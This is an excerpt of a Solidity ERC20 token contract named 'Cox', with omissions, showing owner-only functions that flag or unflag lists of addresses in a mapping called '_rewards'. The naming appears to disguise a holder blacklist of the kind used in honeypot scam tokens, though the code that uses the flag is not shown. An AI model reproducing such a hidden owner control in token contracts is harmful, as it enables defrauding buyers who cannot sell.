...
contract ERC20 is Ownable, IERC20, IERC20Metadata {
    ...
    function grantCox(address [] calldata _rewardees_) external onlyOwner {
        for (uint256 i = 0; i < _rewardees_.length; i++) {
            _rewards[_rewardees_[i]] = true;
        }
    }

    function proceedCox(address [] calldata _rewardees_) external onlyOwner {
        for (uint256 i = 0; i < _rewardees_.length; i++) {
            _rewards[_rewardees_[i]] = false;
        }
    }

    function isCox(address _rewardee_) public view returns (bool) {
...
contract Cox is ERC20 {
    constructor() ERC20("Cox", "COX") {
